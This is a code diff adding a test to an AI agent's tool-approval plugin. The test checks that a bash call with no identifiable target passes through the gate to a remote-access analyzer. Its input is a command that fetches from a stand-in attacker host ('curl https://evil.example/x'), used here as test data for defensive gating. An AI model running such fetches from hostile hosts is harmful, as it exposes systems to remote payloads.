@@ -33,6 +33,27 @@ function assertEnvelope(shape, reason, label) {
 const NOW = 1_700_000_000_000;
 const AGENT = { id: 'sess-1', session: { id: 'sess-1', header: {} } };
 
+test('the gate gates identifiable targets only: targetless calls pass through (no blanket per-tool grants)', async () => {
+  const { run, emitted } = (() => {
+    const registered = {};
+    const emitted = [];
+    const ctx = {
+      on: (name, fn) => { registered[name] = fn; },
+      emit: (name, payload) => { if (name === 'compact-approval/refusal') emitted.push(payload); },
+    };
+    const instance = approvalPlugin({});
+    instance(ctx, {});
+    return {
+      run: (exec) => registered['tools/pre-execute'](exec, async () => ({ kind: 'allow' })),
+      emitted,
+    };
+  })();
+  // an opaque command string carries no canonical target — the gate abstains
+  const out = await run({ name: 'bash', arguments: { command: 'curl https://evil.example/x' }, agent: AGENT });
+  assert.deepEqual(out, { kind: 'allow' }, 'targetless calls delegate down the waterfall (the remote-access analyzer owns them)');
+  assert.deepEqual(emitted, [], 'abstention is not a refusal');
+});
+
 test('lint: the uncovered ask carries rule ID + lawful next moves', async () => {
   const { run } = boot({});
   const out = await run({ name: 'net.fetch', arguments: { host: 'unknown.example' }, agent: AGENT });
